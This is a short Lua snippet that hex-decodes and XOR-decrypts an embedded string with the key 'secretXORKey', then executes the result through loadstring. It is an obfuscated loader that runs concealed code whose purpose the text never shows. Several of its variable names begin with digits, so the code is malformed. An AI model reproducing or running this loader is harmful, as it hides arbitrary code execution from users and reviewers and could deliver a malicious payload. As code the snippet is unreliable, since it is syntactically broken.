local 8wultass59 = "253d2d1e6196d27301c301e2336221b37232c3530783f1126563143c462b261122241e3a2622152c323c23b26df11571015352719263333749102d2e4429d612433132b13115629192919163930185c11102284146e2633c5cf12562e42820157f1f2130493e1f0b2820117d1f21244c3ef3243283761581f233512f297745301e0c111f24235a303323a477b332d2a334403233e1f1d13273020335a3d323c3c20317b16026c523b373c21c77913b20f3930421163f332694d2632f2236446d1d41c284c291c2a39261d19281b8241e3a221b43c23a353632f911801d3f461e3b81f1530172d3153746e7f1982f16172d3152a1d603981c1131156391a291a307a37225c3e123d2d18432167f81c23a293d2a1b29371a7f31253315383681d2e256572"
    local function f2p3mfae0ob()
      local 6gaiucz8qcv = ""
      for i = 1, #8wultass59, 2 do
        local byte = tonumber(8wultass59:sub(i, i + 1), 16)
        6gaiucz8qcv = 6gaiucz8qcv .. string.char(byte)
      end
      local xorKey = "secretXORKey"
      local decoded = ""
      for i = 1, #6gaiucz8qcv do
        decoded = decoded .. string.char(6gaiucz8qcv:byte(i) ~ xorKey:byte((i-1)%#xorKey+1))
      end
      return decoded
    end

    local decodedScript = loadstring(f2p3mfae0ob())()
    print(decodedScript)
  